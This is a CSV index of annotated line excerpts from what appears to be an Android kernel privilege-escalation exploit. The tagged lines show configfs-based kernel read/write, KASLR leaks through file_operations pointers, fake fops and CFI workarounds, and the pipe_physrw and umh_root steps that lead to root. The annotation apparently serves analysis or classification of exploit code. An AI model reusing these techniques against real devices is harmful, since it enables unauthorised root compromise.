path,line,category,excerpt
Makefile,1,build_target,API ?= 35
Makefile,3,build_target,"NDK_ROOT ?= $(or $(ANDROID_NDK_HOME),$(ANDROID_NDK_ROOT))"
Makefile,4,build_target,NDK_CC := $(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android$(API)-clang
Makefile,11,kernel_memory_primitive,src/core/pipe_physrw.c \
Makefile,14,credential_or_execution_transition,src/core/umh_root.c
Makefile,18,build_target,LDFLAGS := -fPIE -pie -pthread
Makefile,25,build_target,$(NDK_CC) $(CFLAGS) $(LDFLAGS) $^ -o $@
src/core/fops.c,2,target_specific_layout,"#include ""runtime_struct_offsets.h"""
src/core/fops.c,9,orchestration,extern int pselect_custom_write;
src/core/fops.c,32,orchestration,uint64_t kaslr_mmap_ptr;
src/core/fops.c,38,orchestration,uint64_t kaslr_expected_mmap;
src/core/fops.c,47,orchestration,int default_delay = pselect_custom_write_enabled() ? 0 : -1;
src/core/fops.c,72,orchestration,static int pselect_words_per_set(void) {
src/core/fops.c,77,orchestration,static int pselect_put_global_word(
src/core/fops.c,101,orchestration,static void pselect_put_waiter_word(
src/core/fops.c,106,orchestration,int placed = pselect_put_global_word(
src/core/fops.c,109,orchestration,"pr_warning(""pselect cannot place %s waiter_word=%d global_word=%d """
src/core/fops.c,122,orchestration,"pr_warning(""pselect F_DUPFD read errno=%d\n"", errno);"
src/core/fops.c,135,orchestration,"void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {"
src/core/fops.c,144,orchestration,pselect_custom_write_enabled() ? fake_task :
src/core/fops.c,152,orchestration,int words_per_set = pselect_words_per_set();
src/core/fops.c,153,orchestration,struct pselect_waiter_word {
src/core/fops.c,168,orchestration,"{12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),"
src/core/fops.c,174,orchestration,struct pselect_waiter_word *w = &words[i];
src/core/fops.c,175,orchestration,pselect_put_waiter_word(
src/core/fops.c,180,orchestration,void do_pselect_fake_lock_route(void) {
src/core/fops.c,184,orchestration,"pr_error(""pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n"","
src/core/fops.c,201,orchestration,"pr_error(""pselect retry page prepare failed attempt=%d base=%016zx """
src/core/fops.c,210,orchestration,"int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);"
src/core/fops.c,212,orchestration,"pr_warning(""pselect timerfd_create failed errno=%d; using pipe read end\n"","
src/core/fops.c,220,orchestration,"pr_error(""pselect F_DUPFD read errno=%d\n"", errno);"
src/core/fops.c,232,orchestration,"prepare_pselect_fdsets(&in, &out, &ex);"
src/core/fops.c,233,orchestration,"pr_info(""pselect route setup attempt=%d simple=%d shift=%d page=%016zx """
src/core/fops.c,266,orchestration,"pr_info(""pselect pre-select +%.0fms\n"", fops_elapsed_ms(&route_t0));"
src/core/fops.c,270,orchestration,"pr_info(""pselect post-select +%.0fms ret=%d\n"", fops_elapsed_ms(&route_t0), ret);"
src/core/fops.c,274,orchestration,"pr_info(""pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n"","
src/core/fops.c,283,orchestration,"pr_info(""pselect route probing cfi attempt=%d ret=%d expected=%d\n"","
src/core/fops.c,286,orchestration,if (pselect_custom_write_enabled()) {
src/core/fops.c,290,target_specific_layout,if (active_offsets && active_offsets->off_system_unbound_wq &&
src/core/fops.c,307,orchestration,"pr_info(""pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n"","
src/core/fops.c,328,orchestration,"pr_info(""pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n"","
src/core/fops.c,331,orchestration,"pr_info(""pselect route done calls=%d success=%d step=%d errno=%d\n"","
src/core/fops.c,339,kernel_memory_primitive,"ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));"
src/core/fops.c,340,kernel_memory_primitive,"ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));"
src/core/fops.c,364,kernel_memory_primitive,"if (kernel_write_data(fd, target, &slots[i].value,"
src/core/fops.c,375,kernel_memory_primitive,"kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);"
src/core/fops.c,376,kernel_memory_primitive,"kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);"
src/core/fops.c,377,kernel_memory_primitive,"kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);"
src/core/fops.c,377,orchestration,"kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);"
src/core/fops.c,378,kernel_memory_primitive,"kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);"
src/core/fops.c,380,kernel_memory_primitive,"kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);"
src/core/fops.c,383,orchestration,!is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
src/core/fops.c,393,orchestration,kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
src/core/fops.c,398,orchestration,kaslr_mmap_ptr != kaslr_expected_mmap ||
src/core/fops.c,416,target_specific_layout,int restore_slide_boot_id(int fd) {
src/core/fops.c,417,target_specific_layout,uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
src/core/fops.c,418,target_specific_layout,slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
src/core/fops.c,419,kernel_memory_primitive,configfs_read_once(
src/core/fops.c,420,target_specific_layout,"fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));"
src/core/fops.c,422,kernel_memory_primitive,configfs_write_once(
src/core/fops.c,423,target_specific_layout,"fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));"
src/core/fops.c,424,kernel_memory_primitive,configfs_read_once(
src/core/fops.c,425,target_specific_layout,"fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));"
src/core/fops.c,426,target_specific_layout,"pr_info(""slide restore boot_id data pid=%d ret=%zd before=%016llx """
src/core/fops.c,437,kernel_memory_primitive,if (!install_pipe_physrw(fd)) return 0;
src/core/fops.c,438,credential_or_execution_transition,if (install_umh_root(fd)) return 1;
src/core/fops.c,465,kernel_memory_primitive,"configfs_write_once(fd, binwrite_target, payload, sizeof(payload));"
src/core/fops.c,487,kernel_memory_primitive,"configfs_read_once(fd, binwrite_target, readback, sizeof(readback));"
src/core/fops.c,498,kernel_memory_primitive,"ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));"
src/core/fops.c,508,target_specific_layout,if (!restore_slide_boot_id(fd)) {
src/core/fops.c,531,kernel_memory_primitive,if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
src/core/fops.c,532,kernel_memory_primitive,physrw_read64_ok && physrw_write64_ok) {
src/core/fops.c,544,kernel_memory_primitive,ssize_t restore = configfs_write_once(
src/core/fops.c,554,kernel_memory_primitive,"ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));"
src/core/fops.c,564,kernel_memory_primitive,"configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));"
src/core/fops.c,584,kernel_memory_primitive,cfi_restore_ret = configfs_write_once(
